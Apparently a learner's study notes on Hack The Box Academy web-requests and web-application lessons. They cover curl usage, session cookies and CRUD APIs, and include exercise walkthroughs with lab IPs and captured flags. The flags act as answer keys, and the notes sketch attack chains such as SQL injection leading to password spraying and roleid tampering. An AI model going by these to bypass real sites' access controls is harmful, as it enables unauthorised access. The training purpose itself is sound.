+*We can also repeat the exact request right within the browser devtools by selecting "Copy>Copy as Fetch". This will copy the same HTTP request using the JavaScript Fetch library. Then we can go to the JavaScript console tab by clicking "CTRL+SHIFT+K", paste our Fetch command and hit enter to send the request. As we see the browser sent our request and we can see the response returned after. We can click on the response to view its details, expand various details, and read them.
+
+------------------------------------------------
+
+
+Exercise: The exercise above seems to be broken, as it returns incorrect results. Use the browser devtools to see what is the request it is sending when we search, and use cURL to search for 'flag' and obtain the flag.
+
+1. First I open my web browser and search the target IP in the URL. The website asked me to sign in so I used the credentials admin:admin.
+
+2. Then I open the devtools and go to the Network tab.
+
+3. Now I open my terminal and type in the command line "curl -i http://<SERVER_IP>:<PORT>/", I got an access denied which means that the page uses basic HTTP auth.
+
+4. Now I'm going to type "curl -u admin:admin http://<SERVER_IP>:<PORT>/" to provide credentials. This time I got the page in the response. 
+
+5. Now I go back to the website and click on anything to engage with the page, then I go back to the Network tab in devtools to look at the engagement.
+
+6. When I look at the Network tab I can see when I engaged the website it sent a "search.php" with GET parameter "search=le", this means that the search function requests another page for results. 
+
+7. Now I'm going to go back to terminals command line and type "curl 'http://<SERVER_IP>:<PORT>/search.php?search=le' -H 'Authorization: Basic YWRtaW46YWRtaW4='" to send the same request directly to "search.php" to get the full search results. I get the output of my search in my command line.
+
+8. Now I'm going to type in the command line "curl http://83.136.255.40:50083/search.php?search=flag -u admin:admin" to get the flag for this exercise.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+POST:
+
+*In the previous section we saw how GET requests may be used by web applications for functionalities like search and accessing pages. However when web applications need to transfer files or move the user parameters from the URL they utilize POST requests. Unlike HTTP GET, which places user parameters within the URL, HTTP POST places user parameters within the HTTP Request body. This has three main benefits: 
+
+		1. Lack of Logging: As Post requests may transfer large files (e.g. file upload), it would not be efficient for the server to log all upload files as part of the requested URL as would be the case with a file uploaded through the GET command.
+
+		2. Less Encoding Requirements: URLs are designed to be shared which means they need to conform to characters that can be converted to letters. The POST request places data in the body which can accept binary data. The only characters that need to be encoded are those that are used to separate parameters.
+
+		3. More data can be sent: The maximum URL length varies between browsers (chrome/firefox), web servers (IIS, Apache, nginx), content delivery networks (fastly, cloudfront, couldfare), and even URL shorteners (bit.ly, amzn.to). Generally speaking a URL's lengths should be kept to below 2,000 characters and so they cannot handle a lot of data.  
+
+
+----------------
+
+
+Login Forms:
+
+*Once we visit the web application we see that it utilizes a PHP login form instead of HTTP basic auth. If we try to login with admin:admin we get in and see a similar search function to the one we say earlier in the GET section. If we clear the network tab in our browser devtools and try to login again we will see many requests being sent. We can filter the requests by our server IP so it would only show requests going to web applications web server (i.e. filter out external requests) and we will notice the following POST command being sent.
+
+*We can click on the request click on the Request tab which shows the request body and then clock on the RAW button to show the raw request data. We see the following data is being sent as the POST request data. 
+
+		Code: bash
+
+		username=admin&password=admin
+
+*With the request data at hand we can try to send a similar request with cURL to see wether this would allow us to login as well. Furthermore as we did in the previous section we can simply right-click on the request and select copy>copy as cURL. However it is important to be able to create POST requests manually. 
+
+*We will use the "-X" post flag to send a post request. Then to add our post data we can use the "-d" flag and add the above data after it as shows:
+
+		Romeltier1@htb[/htb]$ curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/
+
+		...SNIP...
+        		<em>Type a city name and hit <strong>Enter</strong></em>
+		...SNIP...
+
+*If we examine the HTML code, we will not see the login form code, but will see the search function code which indicates that we did ended get authenticated.
+
+------------------------
+
+
+Authenticated Cookies:
+
+*If we were successfully authenticated we should have received a cookie so our browsers can persist our authentication and we sent need to login every time we visit the page. We can use the "-v" or "-i" flags to view the response which should contain the Set-Cookie header with out authenticated cookie:
+
+		Romeltier1@htb[/htb]$ curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/ -i
+
+		HTTP/1.1 200 OK
+		Date: 
+		Server: Apache/2.4.41 (Ubuntu)
+		Set-Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1; path=/
+
+		...SNIP...
+       			 <em>Type a city name and hit <strong>Enter</strong></em>
+		...SNIP...
+
+*With our authenticated cookie we should now be able to interact with the web application without needing to provide our credentials every time. To test this we can set the above cookie with the "-b" flag in cURL as follows:
+
+		Romeltier1@htb[/htb]$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/
+
+		...SNIP...
+     			<em>Type a city name and hit <strong>Enter</strong></em>
+		...SNIP...
+
+*As we can see we were indeed authenticated and got to the search function. It is also possible to specify the cookie as a header as follows:
+
+		curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/
+
+*We may also try the same thing with out browsers. Lets first logout and then we should get back to the login page. Then we can go to the Storage tab in the devtools with "SHIFT+F9". In the storage tab we can click on Cookies in the left pane and select our website to view our current cookies. We may or may not have existing cookies but if we were logged out then our PHP cookie should not be authenticated which is why if we get the login form and not the search function.
+
+*Now lets try to use our earlier authenticated cookie and see if we do get in without needing to provide our credentials. To do so we simply replace the cookie value with our own. Otherwise we can right click on the cookie and select Delete ALL and the click on the "+" icon to add a new cookie. After that we need to enter the cookie name which is the part before the "= PHPSESSID" and then the cookie value which is the part after the "=(c1nsa6op7vtk...)". Then once our cookie is set we can refresh the page and we will see that we do indeed get authenticated without needing to login simply by using an authenticated cookie.
+
+*As we can see having valid cookie may be enough to get authenticated into many web applications. This can be an essential part of some web attacks like Cross-site scripting.
+
+---------------------
+
+
+JSON Data:
+
+*Finally lets see what requests get sent when we interact with the City search function. To do so we will go to the Network tab in the browser devtools and then click on the trash icon to clear all requests. Then we can make any search query to see what requests get sent. 
+
+*As we can see the search form sends a POST request to search.php with the following data:
+
+		{"search":"london"}
+
+*The POST data appear to be in JSON format so our request must have specified the content-type header to be application/json. We can confirm this by right-clicking on the request and selecting Copy>Copy request header.
+
+		POST /search.php HTTP/1.1
+		Host: server_ip
+		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
+		Accept: */*
+		Accept-Language: en-US,en;q=0.5
+		Accept-Encoding: gzip, deflate
+		Referer: http://server_ip/index.php
+		Content-Type: application/json
+		Origin: http://server_ip
+		Content-Length: 19
+		DNT: 1
+		Connection: keep-alive
+		Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1
+
+*Instead we do have content-type: application/json. Lets try to replicate this request as we did earlier but include both the cookie and content type headers and send our request to search.php
+
+		Romeltier1@htb[/htb]$ curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php
+		["London (UK)"]
+
+*As we can see we were able to interact with the search function directly without needing to login or interact with the web application front-end. This can be an essential skill when performing web application assessments or bug bounty exercises as it is much faster to test web applications this way.
+
+*Finally lets try to repeat the same above request by using Fetch as we did in the previous section. We can right-click on the request and select Copy>Copy as Fetch, and then go to the console tab and execute our code there.
+
+*Our request should successfully return the same data we got with cURL.
+
+-----------------------
+
+
+Exercise:
+
+1. First thing I do is obtain the session cookie by typing "curl -X POST -d 'username=admin&password=admin' http://94.237.54.238:49302 -i". Then I press enter.
+
+2. Now that I have the session-cookie which is "PHPSESSID=81cl2p8ek4d0j6r16pvt6ai3gd; path=/", now I am going to use the cookie with cURL to search for the flag by typing "curl -X POST -d '{"search":"flag"}' -b 'PHPSESSID=81cl2p8ek4d0j6r16pvt6ai3gd' -H 'Content-Type: application/json' http://94.237.54.238:49302/search.php".
+
+3. Now I hit enter and the code provided the flag which is "HTB{p0$t_r3p34t3r}".
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+CRUD API:
+
+*We saw examples of a City Search web application that uses PHP parameters to search for a city name in the previous sections. This section will look at how such a web application may utilize APIs to perform the same thing and we will directly interact with the API endpoint. 
+
+
+APIs:
+
+*There are several types of APIs. Many APIs are used to interact with a database such that we would be able to specify the requested table and the requested row within our API query and then use an HTTP method to perform the operation needed. For example, for the api.php endpoint in our example if we wanted to update the city table in the database and the row we will be updating has a city name of London then the URL would look something like this:
+
+		curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london ...SNIP...
+
+
+CRUD:
+
+*As we can see we can easily specify the table and the row we want to perform an operation on through such APIs. Then we may utilize different HTTP methods to perform different operations on that row. In general APIs perform 4 main operations on the requested database entry:
+
+		Operation		HTTP Method		Description
+		
+	1.	Create			POST			Adds the specified data to the database table
+
+	2. 	Read			GET			Reads the specified entity from the database table
+
+	3. 	Update			PUT			Updates the data of the specified database table
+
+	4.	Delete			DELETE			Removes the specified row from the database table
+
+*These four operations are mainly linked to the commonly known CRUD APIs but the dame principle is also used in REST APIs and several other types of APIs. Of course not all APIs work in the same way and the user access control will limit what actions can perform and what results we can see.
+
+
+Read:
+
+*The first thing we will do when interacting with an API is reading data. As mentioned earlier we can simply specify the table name and the API (e.g. /city) and then specify our search term (e.g. /London) as follows:
+
+		Romeltier1@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/api.php/city/london
+
+		[{"city_name":"London","country_name":"(UK)"}]
+
+*We see that the result is sent as a JSON string. To have it properly formatted in JSON format we can pipe the output to the jq utility which will format it properly. We will also silent any unneeded cURL output with "-s" as follows:
+
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq
+
+		[
+ 		 {
+    			"city_name": "London",
+    			"country_name": "(UK)"
+ 		 }
+		]
+
+*As we can see we got the output in a nicely formatted output. We can also provide a search term and get all matching results:
+
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/le | jq
+
+		[
+  		 {
+    		  "city_name": "Leeds",
+   		  "country_name": "(UK)"
+ 		 },
+ 		 {
+   		  "city_name": "Dudley",
+    		  "country_name": "(UK)"
+  		 },
+  		 {
+   		  "city_name": "Leicester",
+   		  "country_name": "(UK)"
+  		 },
+  		 ...SNIP...
+		]
+
+*Finally we can pass an empty string to retrieve all entries in the table:
+
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq
+
+		[
+ 		 {
+    		  "city_name": "London",
+   		  "country_name": "(UK)"
+  		 },
+  		 {
+  		  "city_name": "Birmingham",
+  		  "country_name": "(UK)"
+  		 },
+ 		 {
+  		  "city_name": "Leeds",
+  		  "country_name": "(UK)"
+  		 },
+  		  ...SNIP...
+		]
+
+
+Create:
+
+*To add a new entry we can use an HTTP POST request which is quite similar to what we have performed in the previous section. We can simply POST our JSON data and it will be added to the table. As this API is using JSON data we will also set the Content-Type header to JSON as follows:
+
+		Romeltier1@htb[/htb]$ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
+
+*Now we can read the content of the city we added (HTB_CITY) to see if it was successfully added:
+
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/HTB_City | jq
+
+		[
+		  {
+		    "city_name": "HTB_City",
+		    "country_name": "HTB"
+		  }
+		]
+
+*As we can see a new city was created which did not exist before.
+
+
+Update:
+
+*Now that we know how to read and write entries through APIs lets start discussing two other HTTP methods we have not used so far: PUT and DELETE. As mentioned at the beginning of the section PUT is used to update API entries and modify their details while DELETE is used to remove a specific entity.
+
+*The HTTP PATCH method may also be used to update API entries instead of PUT. To be precise PATCH is used to partially update and entry (only modify some of its data "e.g. only city_name") while PUT is used to update the entire entry. We may also use the HTTP OPTIONS method to see which of the two is accepted by the server and then use the appropriate method accordingly. In this section we will be focusing on the PUT method through their usage is quite similar.
+
+*Using PUT is quite similar to POST in this case with the only difference being that we have to specify the name of the entity we want to edit in the URL. Otherwise the API will not know which entity to edit. So all we have to do is specify the city name in the URL, change the request method to PUT, and provide the JSON data like we did with POST as follows:
+
+		Romeltier1@htb[/htb]$ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
+
+*We see in the example above that we first specified "/city/London" as our city and passed a JSON string that contained "city_name":"New_HTB_City" in the request data. So the London city should no longer exist and a new city with the name "New_HTB_City" should exist. Lets try reading both to confirm:
+
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq
+
+		
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq
+
+		[
+		  {
+		    "city_name": "New_HTB_City",
+		    "country_name": "HTB"
+		  }
+		]
+
+*Indeed we successfully replaced the old city name with the new city.
+
+*In some APIs the update operation may be used to create new entries as well. Basically we would send our data and if it does not exist it would create it. For example in the above example even if an entry with a London city did not exist it would create a new entry with the details we passed. In our example, however, this is not the case. 
+
+
+DELETE:
+
+*Finally lets try to delete a city which is as easy as reading a city. We simplify specify the city name for the API and use the HTTP DELETE method and it would delete the entry as follows:
+
+		Romeltier1@htb[/htb]$ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City
+
+		
+		Romeltier1@htb[/htb]$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq
+		[]
+
+*As we can see after we deleted "New_HTB_City" we get an empty array when we try reading it meaning it no longer exists.
+
+*With this we are able to perform all 4 CRUD operations through cURL. In a real world application such actions may not be allowed for all users or it would be considered a vulnerability if anyone can modify or delete any entry. Each user would have certain privileges on what they can read or write where write refers to adding, modifying, or deleting data. To authenticate our user to use the API we would need to pass a cookie or an authorization header (e.g. JWT) as we did in an earlier section. Other than that the operations are similar to what we practiced in this section.
+
+---------------------
+
+
+Exercise:
+
+*First, try to update any city's name to be 'flag'. Then, delete any city. Once done, search for a city named 'flag' to get the flag. To format the results to JSON use the utility called "jq". To install jq type "sudo apt install jq".
+
+1. First I will use "curl -s http://94.237.53.21:53774/api.php/city | jq" to view all of the cities.
+
+2. Now to update a city name to "flag" I will use "curl -X PUT http://94.237.53.21:53774/api.php/city/Memphis -d '{"city_name":"flag"}' -H 'Content-Type: application/JSON'".
+
+3. Now that I have changed the city name of "Memphis" to "flag", I will delete the city "Baltimore" using "curl -X DELETE http://94.237.53.21:53774/api.php/city/Baltimore".
+
+4. Now that I have deleted the city "Baltimore" I will search for the city named "flag" by using "curl -s http://94.237.53.21:53774/api.php/city/flag | jq".
+
+5. After doing this I get the flag "HTB{crud_4p!_m4n!pul4t0r}".
+
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+
+
+Introduction to Web Applications
+
+*Web applications are interactive applications that run on web browsers. Web applications usually adopt a client server architecture to run and handle interactions. They typically have front end components (i.e. the website interface or "what the user sees") that run on the client side (browser) and other back end components (web application source code) that run on the server side (back end server/database).
+
+*This allows organizations to host powerful applications with near complete real time control over their design and functionality while being accessible worldwide. Some examples of typical web applications include online email services like Gmail, online retailers like Amazon, and online word processors like Google Docs.
+
+*Web applications are not exclusive to giant providers like Google or Microsoft but can be developed by any web developer and hosted online any of the common hosting services to be used by anyone on the internet. This is why today we have millions of web applications all over the internet with billions of users interacting with them everyday.
+
+----------------------
+
+Web Applications vs. Websites:
+
+*In the past we interacted with websites that are static and cannot be changed in real time. This means that traditional websites were statically created to represent specific information and this information would not change with our interaction. To change the websites content the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and therefore do not produce real time changes. That type of website is also known as Web 1.0.
+
+*On the other hand most websites run web applications or Web 2.0 presenting dynamic content based on user interaction. Another significant difference is that web applications are fully functional and can perform various functionalities for the end user while web sites lack this type of functionality. Other key differences between traditional websites and web applications include:
+
+		Being modular
+		
+		Running on any display size
+
+		Running on any platform without being optimized
+
+
+--------------------------
+
+
+Web Applications vs. Native Operating System Applications:
+
+*Unlike native operating system (native OS) applications, web applications are platform independent and can run in a browser on any operating system. These web applications do not have to be installed on a users system because these web applications and their functionality are executed remotely on the remote server and hence do not consume any space on the end users hard drive.
+
+*Another advantage of web applications over native OS applications is version unity. All users accessing a web application use the same version and the same web application which can be continuously updated and modified without pushing updates to each user. Web applications can be updated in a single location (webserver) without developing different builds for each platform which dramatically reduces maintenance and support costs removing the need to communicate changes to all users individually.
+
+*On the other hand native OS applications have certain advantages over web applications mainly their operation speed and the ability to utilize native operating system libraries and local hardware. As native applications are built to utilize native OS libraries they are much faster to load and interact with. Furthermore native applications are usually more capable than web applications as they have a deeper integration to the operating system and are not limited to the browsers capabilities only.
+
+*More recently however hybrid and progressive web applications are becoming more common. They utilize modern frameworks to run web applications using native OS capabilities and resources making them faster than regular web applications and more capable.
+
+-------------------
+
+
+Web Application Distribution:
+
+*There are many open-source web applications used by organizations worldwide that can be customized to meet each organizations needs. Some common open source web applications are:
+
+		WordPress
+
+		OpenCart
+
+		JoomLa
+
+*There are also proprietary closed source web applications which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. Some common closed source web applications may include:
+
+		Wix
+
+		Shopify
+
+		DotNetNuke
+
+------------------------
+
+
+Security Risks of Web Applications:
+
+*Web application attacks are prevalent and present a challenge for most organizations with a web presence regardless of their size. After all they are usually accessible from any country by everyone with an internet connection and a web browser and usually offer a vast attack surface. There are many automated tools for scanning and attacking web applications that in the wrong hands can cause significant damage. As web applications become more complicated and advanced so does the possibility of crucial vulnerabilities being incorporated in their design. 
+
+*A successful web application attack can lead to significant losses and massive business interruptions. Since web applications are run on servers that may hose other sensitive information and are often also linked to databases containing sensitive user or corporate data all of this data could be compromised if a web site is successfully attacked. This is why it is critical for any business that utilizes web applications to properly test these applications for vulnerabilities and patch them promptly while testing that the patch fixes the flaw and does not inadvertently introduce any new flaws. 
+
+*Web application penetration testing is an increasingly critical skill to learn. Any organization looking to secure their internet facing and internal web applications should undergo frequent web application tests and implement secure coding practices at every development life cycle stage. To properly pentest web applications we need to understand how they work, how they are developed, and what kind of risk lies at each layer and component of the application depending on the technologies in use. 
+
+*One of the most common procedures is to start by reviewing a web applications front end components such as HTML, CSS, and JavaScript also known as front end trinity, and attempt to find vulnerabilities such as sensitive data exposure and cross site scripting (XSS). Once all front end components are thoroughly tested we would typically review the web applications core functionality and the interaction between the browser and the webserver to enumerate the technologies the webserver uses and look for exploitable flaws. We typically assess web applications from both an unauthenticated and authenticated perspective if the application has login functionality to maximize coverage and review every possible attack scenario.
+
+-------------------------
+
+
+Attacking Web Applications:
+
+*In this day and age most every company no matter the size has one or more web applications within their external perimeter. These applications can be everything from simple static websites to blogs powered by Content Management Systems (CMS) such as WordPress to complicated applications with sign-up/login functionality supporting various user roles from basic user to super admins. Nowadays it is not very common to find an externally facing host directly exploitable via a known public exploit such as a vulnerable service or Windows remote code execution (RCE) vulnerability though it does happen. Web applications provide a vast attack surface and their dynamic nature means that they are constantly changing and overlooked. A relatively simple code change may introduce a catastrophic vulnerability or a series of vulnerabilities that can be chained together to gain access to sensitive data or remote code execution on the webserver or other hosts in the environment such as database servers.
+
+*It is not uncommon to find flaws that can lead directly to code execution such as a file upload form that allows for the upload of malicious code or a file inclusion vulnerability that can be leveraged to obtain remote code execution. A well known vulnerability that is still quite prevalent in various types of web applications is SQL injection. This type of vulnerability arises from the unsafe handling of user supplied input. It can result in access to sensitive data, reading/writing files on the database server, and even remote code execution. 
+
+*We often find SQL injection vulnerabilities on web applications that use Active Directory for authentication. While we can usually not leverage this to extract passwords since Active Directory administers them we can often pull most or all Active Directory user email addresses which are often the same as their usernames. This data can then be used to perform a password spraying attack against web portals that use Active Directory for authentication such as VPN or Microsoft Outlook Web Access/Microsoft O365. A successful password spray can often result in access to sensitive data such as email or even a foothold directly into the corporate network environment.
+
+*This example shows the damage that can arise from a single web application vulnerability especially when chained to extract data from one application that can be used to attack other portions of a company's external infrastructure. A well rounded infosec professional should have a deep understanding of web applications and be as comfortable attacking web applications as performing network penetration testing and Active Directory attacks. A penetration tester with strong foundation in web applications can often set themselves apart from their peers and find flaws that other may overlook. A few more real world examples of web application attacks and the impact are as follows:
+
+		SQL Injection		Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.
+
+		File Inclusion		Reading source code to find a hidden page or directory which exposes additional functionality that can be sued to gain remote code execution.
+
+		Unrestricted File Upload	A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.
+
+		Insecure Direct Object Referencing (IDOR)	When combined with a flaw such as broken access control this can often be used to access another users files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the 701 to 203 we may edit another users profile.
+
+		Broken Access Control	Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly a user may perform privilege escalation when registering. Consider the POST request when registering a new user which submits the data username=bjones&password=Welcom1&email=bjones@inlanefreight.local&roleid=3. What if we can manipulate the roleid parameter and change it 0 or 1. We have seen real world applications where this was the case and it was possible to quickly register and admin user and access many unintended features of the web application.
+
+*Start becoming familiar with common web application attacks and their implications. Don't worry if any of these terms sound foreign at this point; they will become clearer as you progress and apply an iterative approach to learning.
+
+*Its important to study web applications in depth and become familiar with how they work and many different application stacks. 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Web Application Layout:
+
+*No two web applications are identical. Businesses create web applications for a multitude of uses and audiences. Web applications are designed and programmed differently and back end infrastructure can be set up in many different ways. It is important to understand the various ways web applications can run behind the scenes, the structure of a web application, its components, and how they can be set up within a company's infrastructure.
+
+*Web application layouts consist of many different layers that can be summarized with the following three main categories:
+
+		Web Application Infrastructure	Describes the structure of required components such as the database needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.
+
+		Web Application Components	The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: UI/UC, Client, and Server components.
+
+		Web Application Architecture	Architecture comprises all the relationships between the various web application components.
+
+-----------------------
+
+
+Web Application Infrastructure:
+
+*Web applications can use many different infrastructure setups. These are also called models. The most common ones can be grouped into the following four types:
+
+		Client Server
+		
+		One Server
+
+		Many Servers - One Database
+	
+		Many Servers - Many Databases
+
+-------------------------
+
+
+Client Server:
+
+*Web applications often adopt the client server model. A server hosts the web application in a client server model and distributes it to any clients trying to access it.
+
+*In this model web applications have tow types of components, those in the front end which are usually interpreted and executed on the client side (browser), and components in the back end usually compiled, interpreted, and executed by the hosting server.
+
+*When a client visits the web applications URL (web address i.e. http:www.acme.local) the server uses the main web application interface (UI). Once the user clicks on a button or requests a specific function the browser sends an HTTP web request to the server which interprets this request and performs the necessary tasks to complete the request (i.e. logging the user in, adding an item to the shopping cart, browsing to another page, etc.). Once the server has the required data it sends the result back to the clients browser displaying the result in a human readable way.
+
+*The website we are currently interacting with is also a web application, developed and hosted by hack the box (webserver) and we access it and interact with it using our web browser (client).
+
+*However even though most web applications utilize a client server front back end architecture there are many design implementations. 
+
+---------------------
+
+
+One Server:
+
+*In this architecture the entire web application or even several web applications and their components including database are hosted on a single server. Though this design is straightforward and easy to implement it is also the riskiest design.
+
+*If any web application hosted on this server is compromised in this architecture then all web applications data will be compromised. This design represents an all eggs in one basket approach since if any of the hosted wen applications are vulnerable the entire webserver becomes vulnerable.
+
+*Furthermore if the webserver goes down for any reason all hosted web applications become entirely inaccessible until the issue is resolved.
+
+----------------
+
+
+Many Servers - One Database:
+
+*This model separates the database onto its own database server and allows the web applications hosting server to access the database server to store and retrieve data. It can be seen as many servers to one database and one server to one database as long as the database is separated on its own database server.
+
+*This model can allow several web applications to access a single database to have access to the same data without syncing the data between them. The web applications can be replications of one main application (i.e. primary/backup) or they can separate web applications that share common data.
+
+*This models main advantage from a security point of view is segmentation where each of the main components of a web application is located and hosted separately. In case one webserver is compromised other webservers are not directly affected. Similarly if the database is compromised (i.e. through a SQL injection vulnerability) the web application itself is not directly affected. There are still access control measures that need to be implemented after asset segmentation such as limiting web application access to only data needed to function as intended.
+
+----------------------
+
+
+Many Servers - Many Databases:
+
+*This model builds upon the many servers one database model. However within the database server each web applications data is hosted in a separate database. The web application can only access private data and only common data that is shared across web applications. It is also possible to host each web applications database on its separate database server.
+
+*This design is also widely used for redundancy purposes so if any web server or database goes offline a backup will run in its place to reduce downtime as much as possible. Although this may be more difficult to implement and may require tools like load balancers to function appropriately this architecture is one of the best choices in terms of security due to its proper access control measures and proper asset segmentation.
+
+*Aside from these models there are other web application models available such as serverless web applications or web applications that utilize microservices.
+
+-----------------------
+
+
+Web Application Components:
+
+*Each web application can have a different number of components. Nevertheless all of the components of the models mentioned previously can be broken down to:
+
+		1. Client 
+
+		2. Server: Webserver, Web Application Logic, Database
+
+		3. Services (microservices): 3rd Party Integrations, Web Application Integrations
+
+		4. Functions (Serverless)
+
+------------------------
+
+
+Web Application Architecture:
+
+*The components of a web application are divided into three different layers (AKA Three Tier Architecture):
+
+		1. Presentation Layer	Consists of UI process components that enable communication with the application and the system. These can be accessed by the client web browser and are returned in the form of HTML, JavaScript, and CSS
+
+		2. Application Layer	This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked such as authorization, privileges, and data passed on to the client.
+
+		3. Data Layer		The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.
+
+*Furthermore some web servers can run operating system calls and programs like IIS ISAPI or PHP-CGI.
+
+------------------------
+
+
+Microservices:
+
+*We can think of microservices as independent components of the web application which in most cases are programmed for one task only. For example for an online store we can decompose core tasks into the following components:
+
+		Registration
+
+		Search
+
+		Payments
+
+		Ratings
+
+		Reviews
+
+*These components communicate with the client and with each other. The communication between these microservices is stateless which means that the request and response are independent. This is because the stored data is stored separately from the respective microservices. The use of microservices is considered service oriented architecture (SOA) built as a collection of different automated functions focused on a single business goal. Nevertheless these microservices depend on each other.
+
+*Another essential and efficient microservice component is that they can be written in different programming languages and still interact. Microservices benefit from easier scaling and faster development of applications which encourages innovation and speeds upmarket delivery of new features. Some benefits of microservices include:
+
+		Agility
+	
+		Flexible Scaling
+
+		Easy Deployment
+
+		Reusable Code
+
+		Resilience
+
+----------------------------------
+
+
+Serverless:
+
+*Cloud providers such as AWS, GCP, Azure and many others offer serverless architectures. These platforms provide application frameworks to build such applications without having to worry about the servers themselves. These web applications then run in a stateless computing containers (Docker for example). This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider which gets rid of the need to provision, scale, and maintain servers needed to run applications and databases.
+
+--------------------------------
+
+
+Architecture Security:
+
+*Understanding the general architecture of web applications and each web applications specific design is important when performing a penetration test on any web application. In many cases an individual web applications vulnerability may not necessarily be caused by a programming error but by a design error in its architecture.
+
+*For example an individual web application may have all of its core functionality secure implemented. However due to a lack of proper access control measures in its design, i.e. use of role based access control (RBAC), users may be able to access some admin features that are not intended to be directly accessible to them or even access other users private information without having the privileges to do so. To fix this type of issue a significant design change would need to be implemented which would likely be both costly and time consuming. 
+
+*Another example would be if we cannot find the database after exploiting a vulnerability and gaining control over the back server which may mean that the database is hosted on a separate server. We may only find part of the database data which may mean there are several databases in use. This is why security must be considered at each phase of web application development and penetration tests must be carried throughout the web application development lifecycle.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+Front End vs. Back End:
+
+*We may have heard the terms front end and back end web development or the term full stack web development which refers to both front and back end web development. These terms are becoming synonymous with web application development as they comprise the majority of the web development cycle. However these terms are very different from each other as each refers to one side of the web application and each function and communicate in different areas.
+
+-------------------
+
+
+Front End:
+
+*The front end of a web application contains the users components directly through their web browser (client side). These components make up the source code of the web page we view when visiting a web application and usually include HTML, CSS, and JavaScript which is then interpreted in real time by our browser.
+
+*This includes everything that the user sees and interacts with like the pages main elements such as the title and text HTML, the design and animation of all elements CSS, and what function each part of a page performs JavaScript.
+
+*In modern web applications front end components should adapt to any screen size and work within any browser on any device. This contrasts with back end components which are usually written for a specific platform or operating system. If the front end of a web application is not well optimized it may make the entire web application slow and unresponsive. In this case some users may think that the hosting server or their internet is slow while the issue lies entirely on the client side at the users browser. This is why front end of a web application must be optimized for most platforms, devices including mobile, and screen sizes.
+
+*Aside from frontend code development the following are some of the other tasks related to front end web application development:
+
+		Visual Concept Web Design
+
+		User Interface (UI) Design
+
+		User Experience (UX) Design
+
+*There are many sites available to use to practice front end coding. One example is hack the box. Here we can play around with the editor typing and formatting text and seeing the resulting HTML, CSS, and JavaScript being generated for us. Copy/paste this very simple example into the right hand side of the editor:
+
+		<p><strong>Welcome to Hack The Box Academy</strong><strong></strong></p>
+		<p></p>
+		<p><em>This is some italic text.</em></p>
+		<p></p>
+		<p><span style="color: #0000ff;">This is some blue text.</span></p>
+		<p></p>
+		<p></p>
+
+*Watch the simple HTML code render on the left. Play around with the formatting, headers, colors, etc., and watch the code change.
+
+-------------------------
+
+
+Back End:
+
+*The back end of a web application drives all of the core web application functionalities all of which is executed at the back end server which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with but a website is just a collection of static web pages without a back end.
+
+*There are four main back end components for web applications:
+
+		1. Back End Servers	The hardware and operating system that hosts all other components and are usually run on operating systems like Linux, Windows, or using Containers.
+
+		2. Web Servers		Web server handle HTTP requests and connection. Some examples are Apache, NGINX, and IIS.
+
+		3. Databases		Databases (DBs) store and retrieve the web application data. Some examples of relational databases are MySQL, MSSQL, Oracle, PostgreSQL, while examples of non relational databases include NoSQL and MongoDB.
+
+		4. Development Frameworks	Development frameworks are used to develop the core Web Application. Some well-known frameworks include Laravel (PHP), ASP.NET (C#), Spring (JAVA), Django (Python), and Express (NodeJS JavaScript). 
+
